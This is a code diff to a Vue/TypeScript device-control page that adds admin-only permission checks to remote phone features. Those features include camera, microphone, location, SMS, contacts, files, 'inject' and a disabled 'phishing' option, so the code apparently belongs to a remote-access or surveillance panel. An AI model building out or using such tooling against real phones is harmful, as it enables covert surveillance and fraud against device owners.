@@ -22,40 +22,54 @@ import { listBuilds } from '#/api/applications';
 import { useWebSocket } from '#/composables/useWebSocket';
 import PageContainer from '#/layouts/components/PageContainer.vue';
 import { DEVICE_COMMANDS, SCREEN_COMMANDS } from '#/store/dictionary';
+import { useAuthStore } from '#/store/auth';
 
 import { createDeviceEventState, reduceDeviceEvent } from './device-events';
 import * as P from './device-protocol';
 
 import './device-control.css';
 
-// 权限系统
+const auth = useAuthStore();
+
+// 权限系统：结合认证权限和设备功能权限
 type FeatureName = 'camera' | 'mic' | 'location' | 'sms' | 'contacts' | 'apps' | 'files' | 'inject' | 'phishing' | 'screen' | 'popup';
 
 interface FeaturePermission {
   enabled: boolean;
+  requiresAdmin?: boolean; // 是否需要管理员权限
   reason?: string;
 }
 
 const featurePermissions = reactive<Record<FeatureName, FeaturePermission>>({
-  camera: { enabled: true },
-  mic: { enabled: true },
-  location: { enabled: true },
-  sms: { enabled: true },
-  contacts: { enabled: true },
-  apps: { enabled: true },
-  files: { enabled: true },
-  inject: { enabled: true },
+  camera: { enabled: true, requiresAdmin: true },
+  mic: { enabled: true, requiresAdmin: true },
+  location: { enabled: true, requiresAdmin: true },
+  sms: { enabled: true, requiresAdmin: true },
+  contacts: { enabled: true, requiresAdmin: true },
+  apps: { enabled: true, requiresAdmin: true },
+  files: { enabled: true, requiresAdmin: true },
+  inject: { enabled: true, requiresAdmin: true },
   phishing: { enabled: false, reason: '功能暂未启用' },
-  screen: { enabled: true },
-  popup: { enabled: true },
+  screen: { enabled: true, requiresAdmin: true },
+  popup: { enabled: true, requiresAdmin: true },
 });
 
 function canUseFeature(name: FeatureName): boolean {
-  return featurePermissions[name]?.enabled ?? false;
+  const feature = featurePermissions[name];
+  if (!feature?.enabled) return false;
+  if (feature.requiresAdmin && !auth.canControlDevice()) {
+    return false;
+  }
+  return true;
 }
 
 function getRestrictedReason(name: FeatureName): string {
-  return featurePermissions[name]?.reason ?? '该功能受限';
+  const feature = featurePermissions[name];
+  if (!feature?.enabled) return feature?.reason ?? '该功能暂未启用';
+  if (feature.requiresAdmin && !auth.canControlDevice()) {
+    return '您没有权限执行此操作，需要管理员权限';
+  }
+  return '该功能受限';
 }
 
 const props = defineProps<{ phoneId: string; preferWsSummary?: boolean }>();
@@ -725,10 +739,17 @@ const devicePayloadMap: Record<string, () => null | P.DevicePayload> = {
 };
 
 function sendCommand(key: string) {
+  // Check if user has permission to control device
+  if (!auth.canControlDevice()) {
+    message.error('您没有权限控制此设备，需要管理员权限');
+    return;
+  }
+
   if (!ws.connected.value) {
     message.warning('WebSocket 未连接');
     return;
   }
+
   const builder = devicePayloadMap[key];
   if (!builder) return;
   const payload = builder();
